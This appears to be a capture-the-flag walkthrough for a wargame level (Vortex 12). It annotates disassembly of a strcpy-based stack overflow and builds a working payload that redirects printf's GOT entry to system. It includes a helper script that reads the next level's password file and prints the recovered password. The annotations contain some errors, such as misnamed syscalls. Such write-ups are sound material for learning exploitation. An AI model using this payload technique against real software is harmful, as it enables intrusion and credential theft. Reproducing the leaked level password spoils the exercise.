
Dump of assembler code for function main:
```assembly
   0x080486b8 <+0>:     push   ebp
   0x080486b9 <+1>:     mov    ebp,esp
   0x080486bb <+3>:     push   esi
   0x080486bc <+4>:     push   ebx
   0x080486bd <+5>:     and    esp,0xfffffff0
   0x080486c0 <+8>:     sub    esp,0x20
   0x080486c3 <+11>:    mov    DWORD PTR [esp+0xc],0x0
   0x080486cb <+19>:    mov    DWORD PTR [esp+0x8],0x804865d		// looks like an address in memory
   0x080486d3 <+27>:    mov    DWORD PTR [esp+0x4],0x0
   0x080486db <+35>:    lea    eax,[esp+0x1c]
   0x080486df <+39>:    mov    DWORD PTR [esp],eax
   0x080486e2 <+42>:    call   0x8048550 <pthread_create@plt>		// pthread_start(struct, NULL, 0x804865d, NULL) - starts a thread with function 0x804865d
   0x080486e7 <+47>:    call   0x8048530 <getgid@plt>			// get group id...
   0x080486ec <+52>:    mov    esi,eax
   0x080486ee <+54>:    call   0x8048530 <getgid@plt>
   0x080486f3 <+59>:    mov    ebx,eax
   0x080486f5 <+61>:    call   0x8048530 <getgid@plt>
   0x080486fa <+66>:    mov    DWORD PTR [esp+0xc],esi
   0x080486fe <+70>:    mov    DWORD PTR [esp+0x8],ebx
   0x08048702 <+74>:    mov    DWORD PTR [esp+0x4],eax
   0x08048706 <+78>:    mov    DWORD PTR [esp],0xaa
   0x0804870d <+85>:    call   0x8048540 <syscall@plt>			// sethostname(getgid, ...) - try to elavate privligages...
   0x08048712 <+90>:    call   0x80484f0 <getuid@plt>
   0x08048717 <+95>:    mov    esi,eax
   0x08048719 <+97>:    call   0x80484f0 <getuid@plt>
   0x0804871e <+102>:   mov    ebx,eax
   0x08048720 <+104>:   call   0x80484f0 <getuid@plt>
   0x08048725 <+109>:   mov    DWORD PTR [esp+0xc],esi
   0x08048729 <+113>:   mov    DWORD PTR [esp+0x8],ebx
   0x0804872d <+117>:   mov    DWORD PTR [esp+0x4],eax
   0x08048731 <+121>:   mov    DWORD PTR [esp],0xa4
   0x08048738 <+128>:   call   0x8048540 <syscall@plt>			// settimeofday ...
   0x0804873d <+133>:   mov    eax,DWORD PTR [ebp+0xc]
   0x08048740 <+136>:   add    eax,0x4
   0x08048743 <+139>:   mov    eax,DWORD PTR [eax]
   0x08048745 <+141>:   mov    DWORD PTR [esp],eax
   0x08048748 <+144>:   call   0x8048698 <unsafecode>			// unsafecode(env[1])
   0x0804874d <+149>:   mov    eax,0x0
   0x08048752 <+154>:   lea    esp,[ebp-0x8]
   0x08048755 <+157>:   pop    ebx
   0x08048756 <+158>:   pop    esi
   0x08048757 <+159>:   pop    ebp
   0x08048758 <+160>:   ret 
```   
```assembly
Dump of assembler code for function unsafecode:
   0x08048698 <+0>:     push   ebp
   0x08048699 <+1>:     mov    ebp,esp
   0x0804869b <+3>:     sub    esp,0x418				// allocate 0x408 bytes for local buffer
   0x080486a1 <+9>:     mov    eax,DWORD PTR [ebp+0x8]
   0x080486a4 <+12>:    mov    DWORD PTR [esp+0x4],eax
   0x080486a8 <+16>:    lea    eax,[ebp-0x408]
   0x080486ae <+22>:    mov    DWORD PTR [esp],eax
   0x080486b1 <+25>:    call   0x8048500 <strcpy@plt>			//unsafe strcpy...
   0x080486b6 <+30>:    leave
   0x080486b7 <+31>:    ret

Dump of assembler code for function safecode:
   0x0804865d <+0>:     push   ebp
   0x0804865e <+1>:     mov    ebp,esp
   0x08048660 <+3>:     sub    esp,0x28
   0x08048663 <+6>:     mov    DWORD PTR [ebp-0xc],0x0
   0x0804866a <+13>:    mov    eax,DWORD PTR [ebp-0xc]
   0x0804866d <+16>:    mov    DWORD PTR [esp+0x4],eax
   0x08048671 <+20>:    mov    DWORD PTR [esp],0x80487f0
   0x08048678 <+27>:    call   0x80484c0 <printf@plt>
   0x0804867d <+32>:    mov    eax,ds:0x804a040
   0x08048682 <+37>:    mov    DWORD PTR [esp],eax
   0x08048685 <+40>:    call   0x80484d0 <fflush@plt>
   0x0804868a <+45>:    mov    DWORD PTR [esp],0x1
   0x08048691 <+52>:    call   0x80484e0 <sleep@plt>
   0x08048696 <+57>:    jmp    0x804866a <safecode+13>
```

If we recall, this code is identical to vortex8, but this time the stack isnt executable...  
So, this time we'll want to use the already existing function strcpy to overwrite printf@plt, and run system("%d\n", ...) instead...  
now, we must keep the original thread alive long enough to execute printf, this is done by running system("/bin/sh")  
let's prepare the stack to execute that operation:  
RECALL: a function's stack looks like: RET_ADDR param1 param2 ... parmN  
so: lets call strcpy(printf@got.plt, SYSTEM_ADDR_IN_STACK)  
finding system proved to be easy enough:  
```bash
(gdb) print system
$1 = {int (const char *)} 0xf7fc3eb0 <system>
```
similarly, strcpy address is 0xf7e937b0  

we go to the line call strcpy in unsafecode(), with the parameters dest = printf.got.plt, source=system.plt address (on stack), then return using ret to system("/bin/sh")...  
(remember, ebp = 0xffffd2d4)  

$(python -c 'print "A"*0x408 + "\xd4\xd2\xff\xff" + "\xb1\x86\x04\x08" +"\x0c\xa0\x04\x08" + "BBBB" + "\xb0\x3e\xfc\xf7" + "CCCCCCCC" + "/bin/sh"')  
breakdown of the payload:  
[1032-buffer replaced-ebp jmp-to-(call strcpy@plt) dest-addr source-addr ret-addr-of-unsafecode(system) ret-addr-of-system param1-system]  
we found out the stack locations to be: BBBB = 0xffffd2d8, CCCC = 0xffffd2e4  
$(python -c 'print "A"*0x408 + "\xd4\xd2\xff\xff" + "\xb1\x86\x04\x08" +"\x0c\xa0\x04\x08" + "\xd8\xd2\xff\xff" + "\xb0\x3e\xfc\xf7" + "CCCC\xe4\xd2\xff\xff" + "/bin/sh"')  
let's create a script file called %d and link it to PATH:  
```bash
#/bin/sh

cat /etc/vortex_pass/vortex13
```

at last, we get:  
```bash
vortex12@vortex:/tmp/vt12$ /vortex/vortex12 $(python -c 'print "A"*0x408 + "\xd4\xd2\xff\xff" + "\xb1\x86\x04\x08" +"\x0c\xa0\x04\x08" + "\xd8\xd2\xff\xff" + "\xb0\x3e\xfc\xf7" + "CCCC\xe4\xd2\xff\xff" + "/bin/sh"')
$ jMyg12=nB
Segmentation fault (core dumped)
```
it worked!  
password: jMyg12=nB  



